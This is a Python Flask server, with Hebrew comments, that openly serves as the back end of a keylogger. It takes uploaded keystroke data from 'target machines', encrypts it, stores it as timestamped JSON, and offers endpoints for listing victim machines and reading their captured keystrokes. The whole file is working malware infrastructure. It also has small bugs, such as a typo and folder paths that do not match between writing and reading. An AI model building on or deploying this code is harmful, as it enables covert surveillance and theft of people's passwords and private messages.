import os
import json
import random
import time
from flask import Flask, request, jsonify
from datetime import datetime
from encryptor import Encryptor

# יוצר מופע של יישום Flask
app = Flask(__name__)

# הגדרת נתיב לשמירת קבצי היומן
# נשאר עם המינוח LOG_DIR מהגרסה המקומית
LOG_DIR = 'server_logs'
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)


@app.route('/')
def home():
    """הוסף נקודת קצה מהשרת המרוחק"""
    return "KeyLogger Server is Running"


@app.route('/api/upload', methods=['POST'])
def save_data():
    """שילוב של פונקציית העלאת הנתונים המקומית"""
    status_listen = random.randint(0, 1) # אופציה לעצירת האזנה נצרך להחליף לקלט מהמשתמש
    # בדוק אם הבקשה מכילה נתוני JSON
    if not request.is_json:
        return jsonify({"error": "Request must5 be JSON"}), 400

    # קבל את הנתונים מהבקשה
    data = request.get_json()
    try:
        # קורא לפונקציה הייעודית לשמירת קבצים
        write_to_file(data)
        return jsonify({"message": "Data saved successfully", "status_listen": status_listen}), 200
    except Exception as e:
        return jsonify({"error": "Failed to save data", "details": str(e)}), 500


def write_to_file(data: dict):
    """
    פונקציה לשמירה לקובץ - הועברה מגרסה מקומית.
    היא מטפלת בהצפנה ושמירה.
    """
    if not data:  # במקום בדיקה עם {}, בודק אם המילון ריק או None
        return 200
    encryptor = Encryptor()
    data = encryptor.encrypt_dict(data)
    # יצירת שם קובץ ייחודי עם חותמת זמן
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename = f"{timestamp}.json"
    file_path = os.path.join(LOG_DIR, filename)
    # שמירת הנתונים לקובץ JSON
    with open(file_path, 'w', encoding='utf-8') as f:
        # המר את מילון הפייתון למחרוזת JSON
        json.dump(data, f, indent=4, ensure_ascii=False)
        print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
    return 200


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_machines():
    """הוסף נקודת קצה מהשרת המרוחק"""
    if not os.path.exists(LOG_DIR):
        return jsonify([])
    machines = os.listdir(LOG_DIR)
    return jsonify(machines)


@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    """הוסף נקודת קצה מהשרת המרוחק"""
    machine = request.args.get("machine")
    if not machine:
        return jsonify({"error": "Missing machine"}), 400

    machine_folder = os.path.join(LOG_DIR, machine)
    if not os.path.exists(machine_folder):
        return jsonify([])

    files = sorted(os.listdir(machine_folder))
    data = []
    for file in files:
        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
            data.append(f.read())

    return jsonify(data)


if __name__ == '__main__':
    app.run(debug=True, port=5000)